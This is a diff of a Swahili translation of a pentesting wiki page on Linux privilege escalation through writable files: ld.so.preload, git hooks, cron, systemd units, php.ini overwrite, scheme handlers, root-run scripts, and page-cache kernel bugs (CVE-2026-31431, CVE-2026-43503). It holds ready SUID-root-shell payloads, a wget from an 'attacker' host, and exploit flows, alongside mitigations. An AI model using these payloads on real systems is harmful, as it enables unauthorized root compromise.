@@ -4,8 +4,8 @@
 
 ### /etc/ld.so.preload
 
-Faili hii hufanya kazi kama **`LD_PRELOAD`** env variable, lakini pia hufanya kazi katika **SUID binaries**.\
-Ikiwa unaweza kuiunda au kuibadilisha, unaweza tu kuongeza **path ya library itakayopakiwa** kwa kila binary inayotekelezwa.
+Faili hii hufanya kazi kama variable ya mazingira ya **`LD_PRELOAD`**, lakini pia hufanya kazi katika **SUID binaries**.\
+Ikiwa unaweza kuiunda au kuibadilisha, unaweza tu kuongeza **path ya library itakayopakiwa** pamoja na kila binary inayotekelezwa.
 
 Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
@@ -24,22 +24,22 @@ system("/bin/bash");
 ```
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo **huendeshwa** wakati wa **matukio** mbalimbali katika git repository, kama vile commit inapotengenezwa, merge... Kwa hivyo, ikiwa **script au user mwenye privileges** anafanya vitendo hivi mara kwa mara na inawezekana **kuandika kwenye folder ya `.git`**, hii inaweza kutumika kwa **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo **huendeshwa** wakati wa **matukio** mbalimbali katika repository ya git, kama vile commit inapotengenezwa, merge... Kwa hivyo, ikiwa **script au user mwenye privileged** anafanya vitendo hivi mara kwa mara na inawezekana **kuandika kwenye folder ya `.git`**, hii inaweza kutumiwa kufanya **privesc**.
 
-Kwa mfano, inawezekana **kutengeneza script** katika git repo ndani ya **`.git/hooks`** ili itekelezwe kila mara commit mpya inapotengenezwa:
+Kwa mfano, inawezekana **kutengeneza script** kwenye git repo ndani ya **`.git/hooks`** ili iwe inatekelezwa kila mara commit mpya inapotengenezwa:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-### Cron & Time files
+### Faili za Cron na Muda
 
-Ikiwa unaweza **kuandika files zinazohusiana na cron ambazo root huziendesha**, kwa kawaida unaweza kupata code execution wakati mwingine job inapotekelezwa. Malengo ya kuvutia ni pamoja na:
+Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root huzitekeleza**, kwa kawaida unaweza kupata code execution kazi hiyo itakapoendeshwa tena. Malengo ya kuvutia ni pamoja na:
 
 - `/etc/crontab`
 - `/etc/cron.d/*`
 - `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
-- crontab ya root katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
-- timers za `systemd` na services zinazoanzishwa nazo
+- Crontab ya root yenyewe katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
+- `systemd` timers na services zinazoanzishwa nazo
 
 Ukaguzi wa haraka:
 ```bash
@@ -50,11 +50,11 @@ grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
 ```
 Njia za kawaida za matumizi mabaya:
 
-- **Ongeza root cron job mpya** kwenye `/etc/crontab` au faili lililo katika `/etc/cron.d/`
+- **Ongeza cron job mpya ya root** kwenye `/etc/crontab` au faili ndani ya `/etc/cron.d/`
 - **Badilisha script** ambayo tayari inaendeshwa na `run-parts`
-- **Weka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary inayozinduliwa
+- **Weka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary inayoianzisha
 
-Mfano mdogo wa cron payload:
+Mfano wa payload ndogo ya cron:
 ```bash
 echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
 ```
@@ -68,24 +68,24 @@ chmod 4777 /tmp/rootbash
 EOF
 chmod +x /etc/cron.daily/backup
 ```
-Maelezo:
+Notes:
 
 - `run-parts` kwa kawaida hupuuza majina ya faili yenye nukta, kwa hivyo pendelea majina kama `backup` badala ya `backup.sh`.
-- Baadhi ya distros hutumia `anacron` au timers za `systemd` badala ya cron ya kawaida, lakini wazo la abuse ni lilelile: **modify kile ambacho root itatekeleza baadaye**.
+- Baadhi ya distros hutumia `anacron` au timers za `systemd` badala ya cron ya kawaida, lakini wazo la abuse ni lilelile: **modify kile ambacho root ataexecute baadaye**.
 
-### Faili za Service na Socket
+### Faili za Service & Socket
 
-Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kureload na kurestart unit, au kwa kusubiri service/socket activation path i-trigger.
+Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kureload na kurestart unit hiyo, au kwa kusubiri service/socket activation path i-trigger.
 
-Targets za kuvutia ni pamoja na:
+Targets zinazovutia ni pamoja na:
 
 - `/etc/systemd/system/*.service`
 - `/etc/systemd/system/*.socket`
 - Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
 - Service scripts/binaries zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
-- `EnvironmentFile=` paths zinazoweza kuandikwa na zinazopakiwa na service ya root
+- `EnvironmentFile=` paths zinazoweza kuandikwa na zinazopakiwa na root service
 
-Quick checks:
+Ukaguzi wa haraka:
 ```bash
 ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
 systemctl list-units --type=service --all 2>/dev/null
@@ -94,10 +94,10 @@ grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /
 ```
 Njia za kawaida za abuse:
 
-- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kuirekebisha
+- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kurekebisha
 - **Add a drop-in override** yenye `ExecStart=` hasidi na uondoe ya zamani kwanza
-- **Backdoor** script/binary ambayo tayari imerejelewa na unit
-- **Hijack** socket-activated service kwa kurekebisha faili ya `.service` inayozinduliwa socket inapopokea connection
+- **Backdoor script/binary** ambayo tayari imerejelewa na unit
+- **Hijack a socket-activated service** kwa kurekebisha faili husika ya `.service` inayoanza socket inapopokea connection
 
 Mfano wa override hasidi:
 ```ini
@@ -105,7 +105,7 @@ Mfano wa override hasidi:
 ExecStart=
 ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
 ```
-Mtiririko wa kawaida wa activation:
+Mtiririko wa kawaida wa uanzishaji:
 ```bash
 systemctl daemon-reload
 systemctl restart vulnerable.service
@@ -113,49 +113,49 @@ systemctl restart vulnerable.service
 ```
 Ikiwa huwezi kuanzisha upya services mwenyewe lakini unaweza kuhariri unit iliyoamilishwa na socket, huenda ukahitaji tu **kusubiri muunganisho wa client** ili kuchochea utekelezaji wa service yenye backdoor kama root.
 
-### Overwrite `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye privileged
+### Overwrite `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye privileges
 
-Baadhi ya daemons maalum huthibitisha PHP inayotolewa na mtumiaji kwa kuendesha `php` ikiwa na **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo kwenye sandbox bado ina **uwezo wowote wa kuandika** (kama `file_put_contents`) na unaweza kufikia **path kamili ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika upya config hiyo** ili kuondoa vizuizi, kisha utume payload ya pili inayotekelezwa ikiwa na privileges zilizoinuliwa.
+Baadhi ya daemons maalum huthibitisha PHP inayotolewa na mtumiaji kwa kuendesha `php` ikiwa na **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo kwenye sandbox bado ina **uwezo wowote wa kuandika** (kama `file_put_contents`) na unaweza kufikia **njia kamili ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika upya config hiyo** ili kuondoa vizuizi, kisha uwasilishe payload ya pili inayotekelezwa kwa privileges zilizoinuliwa.<sup>[[2]](#references)</sup>
 
 Mtiririko wa kawaida:
 
-1. Payload ya kwanza huandika upya sandbox config.
-2. Payload ya pili hutekeleza code baada ya functions hatari kuwezeshwa tena.
+1. Payload ya kwanza inaandika upya sandbox config.
+2. Payload ya pili inatekeleza code sasa kwa kuwa functions hatari zimewezeshwa tena.
 
-Mfano wa chini (badilisha path inayotumiwa na daemon):
+Mfano mdogo (badilisha path kwa ile inayotumiwa na daemon):
 ```php
 <?php
 file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
 ```
-Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), execution ya pili hupata root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.
+Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), utekelezaji wa pili unapata root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.
 
 ### binfmt_misc
 
-File iliyo katika `/proc/sys/fs/binfmt_misc` huonyesha ni binary gani inapaswa ku-execute aina fulani ya files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
+File iliyopo katika `/proc/sys/fs/binfmt_misc` inaonyesha ni binary ipi inapaswa kutekeleza aina zipi za files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
 
-### Overwrite schema handlers (kama http: au https:)
+### Overwrite schema handlers (like http: or https:)
 
-Attacker aliye na write permissions kwenye configuration directories za victim anaweza kwa urahisi kubadilisha au kuunda files zinazobadilisha tabia ya mfumo, na kusababisha code execution isiyokusudiwa. Kwa kubadilisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file hasidi (kwa mfano, kuweka `x-scheme-handler/http=evil.desktop`), attacker anahakikisha kwamba **kubofya link yoyote ya http au https kuna-trigger code iliyobainishwa katika file hiyo ya `evil.desktop`**. Kwa mfano, baada ya kuweka code hasidi ifuatayo katika `evil.desktop` ndani ya `$HOME/.local/share/applications`, kubofya URL yoyote ya nje kuna-run command iliyowekwa ndani:
+Mshambuliaji aliye na write permissions kwenye victim's configuration directories anaweza kwa urahisi kubadilisha au kuunda files zinazobadilisha system behavior, na kusababisha code execution isiyokusudiwa. Kwa kubadilisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file hasidi (kwa mfano, kuweka `x-scheme-handler/http=evil.desktop`), mshambuliaji anahakikisha kwamba **kubofya link yoyote ya http au https kunatekeleza code iliyoainishwa katika file hiyo ya `evil.desktop`**. Kwa mfano, baada ya kuweka code hasidi ifuatayo katika `evil.desktop` iliyopo `$HOME/.local/share/applications`, kubofya URL yoyote ya nje kunaendesha command iliyopachikwa:
 ```bash
 [Desktop Entry]
 Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
 Type=Application
 Name=Evil Desktop Entry
 ```
-Kwa maelezo zaidi, angalia [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumika ku-exploit real vulnerability.
+Kwa maelezo zaidi, angalia [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumika ku-exploit vulnerability halisi.
 
-### Root ikitekeleza scripts/binaries zinazoweza kuandikwa na user
+### Root kutekeleza scripts/binaries zinazoandikika na mtumiaji
 
-Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote iliyo ndani ya directory inayomilikiwa na unprivileged user), unaweza kuiteka:
+Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na user asiye na privileged), unaweza kuiteka:<sup>[[1]](#references)</sup>
 
-- **Tambua utekelezaji:** monitor processes kwa kutumia [pspy](https://github.com/DominicBreuker/pspy) ili kunasa root iki-invoke paths zinazodhibitiwa na user:
+- **Detect the execution:** monitor processes kwa [pspy](https://github.com/DominicBreuker/pspy) ili kubaini root iki-invoke paths zinazodhibitiwa na user:
 ```bash
 wget http://attacker/pspy64 -O /dev/shm/pspy64
 chmod +x /dev/shm/pspy64
 /dev/shm/pspy64   # wait for root commands pointing to your writable path
 ```
-- **Thibitisha writeability:** hakikisha faili lengwa na directory yake zinamilikiwa na mtumiaji wako na zinaweza kuandikwa na mtumiaji wako.
-- **Hijack target:** backup binary/script ya awali na weka payload inayounda SUID shell (au root action nyingine yoyote), kisha restore permissions:
+- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na directory yake zinamilikiwa na user wako au zinaweza kuandikiwa na user wako.
+- **Hijack target:** hifadhi backup ya binary/script asili na weka payload inayounda SUID shell (au root action nyingine), kisha rejesha permissions:
 ```bash
 mv server-command server-command.bk
 cat > server-command <<'EOF'
@@ -166,78 +166,78 @@ chmod 6777 /tmp/rootshell
 EOF
 chmod +x server-command
 ```
-- **Trigger the privileged action** (kwa mfano, kubonyeza UI button inayozindua helper). Root itakapoendesha tena path iliyotekwa, pata escalated shell kwa `./rootshell -p`.
+- **Trigger the privileged action** (kwa mfano, kubofya kitufe cha UI kinachozindua helper). Root inapotekeleza tena path iliyo-hijackiwa, pata shell iliyoinuliwa kwa `./rootshell -p`.
 
-### Page-cache-only file modification of privileged binaries
+### Marekebisho ya privileged binaries kwenye page cache pekee
 
-Baadhi ya kernel bugs hazibadilishi file **iliyo kwenye disk**. Badala yake, zinakuruhusu kubadilisha tu **page cache copy ya file inayoweza kusomeka**. Ikiwa unaweza kulenga binary yenye **setuid** au inayotekelezwa na **root**, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na kuongeza privileges, ingawa file hash iliyo kwenye disk haijabadilika.
+Baadhi ya kernel bugs hazirekebishi file **kwenye disk**. Badala yake, hukuruhusu kurekebisha tu **nakala ya page cache** ya file inayoweza kusomeka. Ikiwa unaweza kulenga binary yenye **setuid** au inayotekelezwa na **root** kwa njia nyingine, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na kuongeza privileges, ingawa file hash iliyo kwenye disk haijabadilika.
 
-Hii ni muhimu kuifikiria kama **runtime-only file write primitive**:
+Ni muhimu kufikiria hili kama **runtime-only file write primitive**:
 
-- **Disk inabaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
-- **Memory ni dirty**: processes zinazosoma au kuendesha cached page hupata content iliyobadilishwa na attacker
-- **Effect ni ya muda**: mabadiliko hupotea baada ya reboot au cache eviction
+- **Disk hubaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
+- **Memory huwa dirty**: processes zinazosoma au kutekeleza page iliyo kwenye cache hupata content iliyorekebishwa na attacker
+- **Athari ni ya muda**: mabadiliko hutoweka baada ya reboot au cache eviction
 
 Primitive hii iko kati ya **arbitrary file write** ya kawaida na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:
 
 - Dirty COW ilitegemea race
-- Dirty Pipe ilikuwa na write-position constraints
-- Primitive ya page-cache-only inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa writes za moja kwa moja kwenye cached file-backed pages
+- Dirty Pipe ilikuwa na vikwazo vya write-position
+- Primitive ya page-cache-only inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa direct writes kwenye cached file-backed pages
 
 #### Generic privesc flow
 
 1. Pata kernel primitive inayoweza kuandika kwenye **file-backed page cache pages**
 2. Itumie dhidi ya **readable privileged binary** au file nyingine inayotekelezwa na root
 3. Trigger execution **kabla** page haijaondolewa kwenye cache
-4. Pata code execution kama root huku file iliyo kwenye disk ikiendelea kuonekana kuwa haijabadilishwa
+4. Pata code execution kama root huku file iliyo kwenye disk ikiendelea kuonekana haijarekebishwa
 
 Typical high-value targets:
 
-- **setuid-root** binaries
+- Binaries za **setuid-root**
 - Helpers zinazozinduliwa na **root services**
-- Binaries zinazoendeshwa mara kwa mara kutoka kwenye **containers zinazoshiriki host kernel/page cache**
+- Binaries zinazotekelezwa mara kwa mara kutoka kwenye **containers zinazoshiriki host kernel/page cache**
 
 #### AF_ALG + `splice()` example path
 
-Copy Fail (CVE-2026-31431) ni mfano mzuri wa class hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):
+Copy Fail (CVE-2026-31431) ni mfano mzuri wa class hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
 
 - `splice()` inaweza kuhamisha references za page-cache pages kutoka kwenye file inayoweza kusomeka kwenda kwenye crypto TX scatterlist
 - in-place `algif_aead` decrypt path ilitumia tena source na destination buffers
 - `authencesn` kisha iliandika kwenye destination tag region
-- region hiyo ilipokuwa bado inareference spliced file-backed pages, write iliishia kwenye **page cache ya target file**
+- region hiyo ilipokuwa bado inarejelea spliced file-backed pages, write iliingia kwenye **page cache ya target file**
 
-Kwa hiyo technique inayovutia si CVE yenyewe, bali pattern hii:
+Kwa hiyo technique ya kuvutia si CVE yenyewe, bali pattern hii:
 
 - **feed file-backed cache pages kwenye kernel subsystem**
 - ifanye subsystem **izichukulie kama writable output**
 - trigger overwrite ndogo inayodhibitiwa kwenye memory
 
-Public PoC ilitumia **4-byte writes** zinazorudiwa ku-patch `/usr/bin/su` kwenye memory, kisha ikaitekeleza.
+Public PoC ilitumia **4-byte writes** zinazorudiwa ku-patch `/usr/bin/su` kwenye memory na kisha kui-execute.
 
 #### ESP / XFRM + netfilter TEE clone example path
 
-DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini wakati huu sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.
+DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini wakati huu sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
 
-Technique muhimu ni **metadata-laundering step**:
+Technique muhimu ni hatua ya **metadata-laundering**:
 
 - `splice()` huweka **read-only file-backed page-cache page** ndani ya ESP-in-UDP packet
-- mitigation ya awali ya DirtyFrag iliweka tag `SKBFL_SHARED_FRAG` kwenye skb ili `esp_input()` ifanye **copy kabla ya decrypting**
-- netfilter `TEE` hunakili packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
-- clone huhifadhi **physical page-cache reference ileile** lakini hupoteza `SKBFL_SHARED_FRAG`
-- `esp_input()` basi huichukulia clone kuwa salama na huendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page
+- mitigation ya awali ya DirtyFrag ili-tag skb hiyo kwa `SKBFL_SHARED_FRAG` ili `esp_input()` ifanye **copy kabla ya decrypting**
+- netfilter `TEE` hu-duplicate packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
+- clone huhifadhi **physical page-cache reference ile ile** lakini hupoteza `SKBFL_SHARED_FRAG`
+- `esp_input()` kisha huichukulia clone kuwa salama na huendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page
 
-Kwa hiyo somo kwa reviewer ni pana kuliko CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua ikiwa operation lazima ifanye copy kwanza, **clone/copy path** yoyote inayohifadhi backing page lakini kuondoa metadata inaweza kufungua tena write primitive bila kutambuliwa.
+Kwa hiyo somo kwa reviewer ni pana zaidi ya CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua kama operation lazima ifanye copy kwanza, **clone/copy path** yoyote inayohifadhi backing page lakini kuondoa metadata inaweza kufungua tena write primitive bila kutambuliwa.
 
 Typical exploitation flow:
 
 1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
-2. washa loopback na uweke **netfilter `TEE` rule** kwenye `mangle/OUTPUT`
-3. weka **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
+2. washa loopback na usakinishe **netfilter `TEE` rule** kwenye `mangle/OUTPUT`
+3. sakinisha **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
 4. encode kila target 4-byte word kwenye SA `seq_hi` field (DirtyFrag's word-selection trick)
-5. tuma spliced ESP-in-UDP packet ili **TEE clone** ifike kwenye `esp_input()` na ifanye decrypt **in place**
-6. rudia hadi page-cache copy ya `/usr/bin/su` au privileged executable nyingine iwe na code inayodhibitiwa na attacker
+5. tuma spliced ESP-in-UDP packet ili **TEE clone** ifike `esp_input()` na ifanye decrypt **in place**
+6. rudia hadi nakala ya page-cache ya `/usr/bin/su` au executable nyingine privileged iwe na code inayodhibitiwa na attacker
 
-Kwa upande wa uendeshaji, impact ni sawa na mfano wa `AF_ALG`: file iliyo kwenye disk inabaki safi, lakini `execve()` hutumia **mutated page-cache bytes** na kutoa root.
+Kwa upande wa uendeshaji, impact ni sawa na mfano wa `AF_ALG`: file iliyo kwenye disk hubaki safi, lakini `execve()` hutumia **mutated page-cache bytes** na kutoa root.
 
 Useful exposure checks kwa variant hii:
 ```bash
@@ -248,11 +248,11 @@ modprobe -n -v esp4 2>/dev/null
 modprobe -n -v esp6 2>/dev/null
 lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
 ```
-Kupunguza attack surface kwa muda mfupi pia kunategemea path maalum hapa: kusasisha hadi kernel yenye `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kuondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kuondoa **decrypt sink**.
+Kupunguza attack-surface kwa muda mfupi pia ni mahususi kwa path hapa: kufanya upgrade hadi kernel yenye `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kukiondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.
 
-#### Exposure and hunting
+#### Exposure na hunting
 
-Ikiwa unashuku aina hii ya bug, usitegemee ukaguzi wa integrity ya disk pekee. Pia thibitisha:
+Ikiwa unashuku aina hii ya bug, usitegemee ukaguzi wa disk integrity pekee. Pia thibitisha:
 ```bash
 uname -r
 grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
@@ -263,31 +263,31 @@ find / -perm -4000 -type f 2>/dev/null
 - `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
 - setuid binaries ni targets nzuri kwa sababu patch ya page-cache-only inaweza kutosha kubadilisha foothold ya ndani kuwa root
 
-#### Kupunguza attack surface kwa njia ya `algif_aead`
+#### Attack-surface reduction kwa njia ya `algif_aead`
 
 Ikiwa interface iliyo hatarini inatolewa na module inayoweza kupakiwa:
 ```bash
 echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
 rmmod algif_aead 2>/dev/null || true
 ```
-Ikiwa imecompiled kwenye kernel, baadhi ya disclosures ziliripotiwa kuzuia init path kwa:
+Ikiwa ime-compile ndani ya kernel, baadhi ya disclosures zimeripotiwa kuzuia init path kwa:
 ```bash
 initcall_blacklist=algif_aead_init
 ```
-Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface maalum ya hiari, ku-disable au ku-blacklist interface hiyo kunaweza kuvunja njia ya exploit hata kabla full kernel upgrade haijapatikana.
+Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface maalum ya hiari, kuzima au ku-blacklist interface hiyo kunaweza kuvunja njia ya exploit hata kabla full kernel upgrade haijapatikana.
 
 ## Marejeo
 
-- [HTB Bamboo – kuteka script inayotekelezwa na root katika directory ya PaperCut inayoweza kuandikwa na mtumiaji](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
-- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
-- [Tenable: Maswali yanayoulizwa mara kwa mara kuhusu Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
-- [Taarifa ya ufichuzi ya Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
-- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
-- [Ushauri wa Copy Fail](https://copy.fail/)
-- [Maelezo ya kiufundi ya Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
-- [Hazina ya DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
-- [JFrog: Kuchanganua na kutumia Linux LPE variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
-- [Linux fix: net: skb: kuhifadhi `SKBFL_SHARED_FRAG` katika `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
-- [Mitigation ya awali ya Linux: kuweka `SKBFL_SHARED_FRAG` kwa paketi za UDP zilizosplice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
+- [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
+- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
+- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
+- [4] [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
+- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
+- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
+- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
+- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
+- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
+- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
+- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
 
 {{#include ../../banners/hacktricks-training.md}}
